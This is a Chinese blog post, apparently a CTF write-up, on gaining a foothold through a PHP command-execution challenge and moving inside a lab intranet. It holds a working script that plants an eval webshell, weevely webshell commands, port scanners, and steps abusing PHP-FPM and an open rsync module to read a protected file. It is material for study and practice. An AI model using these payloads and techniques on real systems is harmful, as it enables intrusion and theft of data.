@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>由一道入群题学习内网渗透基础</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/gh/tonsky/FiraCode@2/distr/fira_code.css" rel="stylesheet">
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2020/03/19/Git%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/&title=由一道入群题学习内网渗透基础" target="_blank" rel="noopener"><i class="fab fa-qq " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/&title=由一道入群题学习内网渗透基础" target="_blank" rel="noopener"><i class="fab fa-weibo " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/&text=由一道入群题学习内网渗透基础" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=由一道入群题学习内网渗透基础&body=Check out this article: http://yoursite.com/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目名称：ctf473831530-2018-web-virink-web"><span class="toc-number">1.</span> <span class="toc-text">题目名称：ctf473831530_2018_web_virink_web</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        由一道入群题学习内网渗透基础
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-03-19T05:44:31.000Z" itemprop="datePublished">2020-03-19</time>
+        
+        (Updated: <time datetime="2020-03-19T05:49:13.085Z" itemprop="dateModified">2020-03-19</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%96%B9%E5%90%91/">渗透方向</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/buuoj/" rel="tag">buuoj</a>, <a class="tag-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="题目名称：ctf473831530-2018-web-virink-web"><a href="#题目名称：ctf473831530-2018-web-virink-web" class="headerlink" title="题目名称：ctf473831530_2018_web_virink_web"></a>题目名称：ctf473831530_2018_web_virink_web</h3><ol>
+<li>页面打开是源代码</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    $sandbox &#x3D; &#39;&#x2F;www&#x2F;sandbox&#x2F;&#39; . md5(&#39;orange&#39; . $_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line">    mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;&#x3D; 20) &#123;</span><br><span class="line">        exec($_GET[&#39;cmd&#39;]);</span><br><span class="line">    &#125; else if (isset($_GET[&#39;reset&#39;])) &#123;</span><br><span class="line">        exec(&#39;&#x2F;bin&#x2F;rm -rf &#39; . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;br &#x2F;&gt; IP : &#123;\$_SERVER[&#39;REMOTE_ADDR&#39;]&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>利用<code>1=&gt;filename</code>的特性创建特殊的文件，然后<code>ls -tr</code>列文件拼出完整的shell。exp如下：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">base_url &#x3D; &#39;http:&#x2F;&#x2F;d9cdeeab-00ae-45c0-bc56-45fb800d996a.node3.buuoj.cn&#39;</span><br><span class="line"></span><br><span class="line">def exec_cmd2(c):</span><br><span class="line">    # exec cmd</span><br><span class="line">    my_params &#x3D; &#123;</span><br><span class="line">        &#39;cmd&#39;: c</span><br><span class="line">    &#125;</span><br><span class="line">    r &#x3D; requests.get(base_url, params&#x3D;my_params)</span><br><span class="line">    print(&#39;exec cmd2&#39;, c, r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def write_webshell():</span><br><span class="line">    filename &#x3D; [r&#39;&gt;echo\ \\&#39;, r&quot;&gt;\&#39;\&lt;\?php \\&quot;, r&#39;&gt;eval\(&#39;, r&#39;&gt;\$_POST\[c\]\)&#39;, r&quot;&gt;\;\&#39;\&gt;2.php&quot;]</span><br><span class="line">    for i in filename:</span><br><span class="line">        my_params &#x3D; &#123;</span><br><span class="line">            &#39;cmd&#39;: i</span><br><span class="line">        &#125;</span><br><span class="line">        r &#x3D; requests.get(base_url, params&#x3D;my_params)</span><br><span class="line">        print(i, r.status_code)</span><br><span class="line"></span><br><span class="line">    cmd_list &#x3D; [&#39;ls -tr&gt;1.sh&#39;, &#39;sh 1.sh&#39;]</span><br><span class="line">    for i in cmd_list:</span><br><span class="line">        exec_cmd2(i)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    write_webshell()</span><br><span class="line">    print(&#39;ok&#39;)</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>就可以成功写入一句话木马，通过小马利用蚁剑传一个大马上去(ps:这里使用的是kali自带的weevely3)</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely generate pass &#x2F;home&#x2F;hw&#x2F;桌面&#x2F;1.php</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>结合提示python3以及flag不在此serve，可以想到需要内网渗透，但是tmd ifconfig等查ip的命令都被禁用了，这里可用cat /etc/hosts或者 cat /proc/net/fib_trie查看，另外包含phpinfo页面也可成功拿到本机ip</li>
+</ol>
+<p><img src="/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/image-20200215224239332.png" alt></p>
+<ol start="5">
+<li>使用weevely3连接大马，进行下一步操作</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely http:&#x2F;&#x2F;d9cdeeab-00ae-45c0-bc56-45fb800d996a.node3.buuoj.cn&#x2F;sandbox&#x2F;0098771fc87704c388bc566c6cd8104b&#x2F;1.php pass</span><br></pre></td></tr></table></figure>
+
+<p>上传一个ip&amp;port扫描的脚本:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">import telnetlib</span><br><span class="line">import threading</span><br><span class="line">import queue</span><br><span class="line">import sys</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def get_ip_status(ip):</span><br><span class="line">    server &#x3D; telnetlib.Telnet()</span><br><span class="line">    for port in [21, 22, 23, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 443, 873, 1433, 3306, 3389, 5432, 6082, 6379, 7001, 7002, 8000, 9000,9090, 8080, 8081, 8089, 9090, 27017, 27018]:</span><br><span class="line">        try:</span><br><span class="line">            server.open(ip, port)</span><br><span class="line">            print(&#39;&#123;0&#125; port &#123;1&#125; is open&#39;.format(ip, port))</span><br><span class="line">        except Exception as err:</span><br><span class="line">            #print(&#39;&#123;0&#125; port &#123;1&#125; is not open&#39;.format(ip, port))</span><br><span class="line">            pass</span><br><span class="line">        finally:</span><br><span class="line">            server.close()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def check_open(q):</span><br><span class="line">    try:</span><br><span class="line">        while True:</span><br><span class="line">            ip &#x3D; q.get_nowait()</span><br><span class="line">            get_ip_status(ip)</span><br><span class="line">    except queue.Empty as e:</span><br><span class="line">        pass</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    host &#x3D; []</span><br><span class="line">    ip &#x3D; sys.argv[1:]</span><br><span class="line">    ip &#x3D; &quot;&quot;.join(ip)</span><br><span class="line">    args &#x3D; &quot;.&quot;.join(ip.split(&quot;.&quot;)[:-1])</span><br><span class="line">    for i in range(1, 256):</span><br><span class="line">        host.append(&quot;&#123;off1&#125;.&#123;off2&#125;&quot;.format(off1&#x3D;args, off2&#x3D;i))</span><br><span class="line">    q &#x3D; queue.Queue()</span><br><span class="line">    for ip in host:</span><br><span class="line">        q.put(ip)</span><br><span class="line">    threads &#x3D; []</span><br><span class="line">    for i in range(10):</span><br><span class="line">        t &#x3D; threading.Thread(target&#x3D;check_open, args&#x3D;(q,))</span><br><span class="line">        t.start()</span><br><span class="line">        threads.append(t)</span><br><span class="line"> </span><br><span class="line">    for t in threads:</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure>
+
+<p>简易版本端口扫描：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line"></span><br><span class="line">def foo():</span><br><span class="line">    with open(&#39;active_port.txt&#39;,&#39;at&#39;) as f:</span><br><span class="line">        for i in range(65535+1):</span><br><span class="line">            ip &#x3D; &#39;172.64.152.4&#39;</span><br><span class="line">            try:</span><br><span class="line">                s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.connect((ip,i))</span><br><span class="line">                s.close()</span><br><span class="line">                f.writelines(str(i)+&#39;\n&#39;)</span><br><span class="line">            except socket.error:</span><br><span class="line">                pass</span><br><span class="line">        f.close()</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    foo()</span><br><span class="line">    print(&#39;ok&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>可以在结果发现，172.16.233.111开放了80，873，9000端口，继续写脚本探测80端口：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">import urllib.request</span><br><span class="line">import time</span><br><span class="line">HEADERS &#x3D; &#123;&#39;user-agent&#39;: (&#39;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_10_5)&#39;</span><br><span class="line">                          &#39;AppleWebKit&#x2F;537.36 (KHTML, like Gecko)&#39;</span><br><span class="line">                          &#39;Chrome&#x2F;45.0.2454.101 Safari&#x2F;537.36&#39;),</span><br><span class="line">           &#39;referer&#39;: &#39;http:&#x2F;&#x2F;172.16.233.111&#x2F;index.html&#39;,</span><br><span class="line">           &#39;X-Forwared-For&#39;: &#39;127.0.0.1&#39;</span><br><span class="line">           &#125;</span><br><span class="line">file &#x3D; urllib.request.Request(&quot;http:&#x2F;&#x2F;172.16.233.111:80&#x2F;&quot;, headers&#x3D;HEADERS)</span><br><span class="line"> </span><br><span class="line">data &#x3D; urllib.request.urlopen(file)</span><br><span class="line"> </span><br><span class="line">print(data.headers)</span><br><span class="line">print(data.read().decode(&#39;utf-8&#39;))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/image-20200215231542666.png" alt></p>
+<p>老高做的时候用net_curl命令进行探测</p>
+<p><img src="/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/image-20200319134817242.png" alt></p>
+<p>873对应Rsync，9000对应FPM。我们先试试9000的FPM漏洞。</p>
+<p>利用在Phithon牛一篇文章（<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html）中的脚本（https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75）读取一下目录" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html）中的脚本（https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75）读取一下目录</a></p>
+<p><img src="/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/image-20200215233458653.png" alt></p>
+<p>发现存在flag，但是没有权限读取。利用rsync可以读取flag</p>
+<p>简单来说rsync是可以实现增量备份的工具，默认端口为873</p>
+<blockquote>
+<p>rsync可以实现scp的远程拷贝(rsync不支持远程到远程的拷贝，但scp支持)、cp的本地拷贝、rm删除和”ls -l”显示文件列表等功能</p>
+</blockquote>
+<p>这里要关注的是rsync daemon模式</p>
+<blockquote>
+<p>rsync daemon是向外提供服务的，这样只要告诉了别人rsync的url路径，外人就能向ftp服务器一样获取文件列表并进行选择性地下载</p>
+</blockquote>
+<p>所以我们可以利用这一点获取rsync允许访问目录下的文件。</p>
+<blockquote>
+<p>rsync daemon是”rsync  –daemon”或再加上其他一些选项启动的，它会读取配置文件，默认是/etc/rsyncd.conf，并默认监听在873端口上，当外界有客户端对此端口发起连接请求，通过这个网络套接字就可以完成连接，以后与该客户端通信的所有数据都通过该网络套接字传输。</p>
+</blockquote>
+<p>根据这篇文章介绍的<a href="https://www.cnblogs.com/f-ck-need-u/p/7220009.html#auto_id_0" target="_blank" rel="noopener">https://www.cnblogs.com/f-ck-need-u/p/7220009.html#auto_id_0</a></p>
+<p>首先查看<code>/etc/rsyncd.conf</code></p>
+<p><img src="/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/image-20200215233930976.png" alt></p>
+<p>定义了模块<code>src</code>，路径中包含flag，<br> 那么可以使用命令<code>rsync 127.0.0.1::src/7h1s_i5_f14g /tmp/</code>将flag备份出来</p>
+<p><img src="/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/image-20200215234020817.png" alt></p>
+<p>参考资料：</p>
+<blockquote>
+<p><a href="https://tiaonmmn.github.io/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/" target="_blank" rel="noopener">https://tiaonmmn.github.io/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/</a></p>
+<p><a href="https://www.cnblogs.com/20175211lyz/p/12239018.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/12239018.html</a></p>
+<p><a href="https://www.youncyb.cn/?p=435" target="_blank" rel="noopener">https://www.youncyb.cn/?p=435</a></p>
+<p>weevely用法：<a href="https://www.cnblogs.com/yufusec/p/9245618.html" target="_blank" rel="noopener">https://www.cnblogs.com/yufusec/p/9245618.html</a></p>
+</blockquote>
+
+  </div>
+</article>
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目名称：ctf473831530-2018-web-virink-web"><span class="toc-number">1.</span> <span class="toc-text">题目名称：ctf473831530_2018_web_virink_web</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/&title=由一道入群题学习内网渗透基础" target="_blank" rel="noopener"><i class="fab fa-qq fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/&title=由一道入群题学习内网渗透基础" target="_blank" rel="noopener"><i class="fab fa-weibo fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/&text=由一道入群题学习内网渗透基础" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=由一道入群题学习内网渗透基础&body=Check out this article: http://yoursite.com/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 John Doe 
+    <a href="http://www.beian.miit.gov.cn/" target="_blank">湘ICP备17005082号</a>
+    
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+  
+  <div class="footer-custom">
+    Framework by <a href="https://hexo.io" target="_blank">Hexo</a> & Theme by <a href="https://github.com/xuthus5/hexo-theme-cactus" target="_blank">Cactus-CN</a> & CDN provided by
+     
+      <a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank">
+        <img class="img-response" src="/images/upyun.png" alt="cdn image">
+      </a>
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/justifiedGallery/3.7.0/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+
+
+<script src="https://cdn.staticfile.org/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+</body>
+</html>
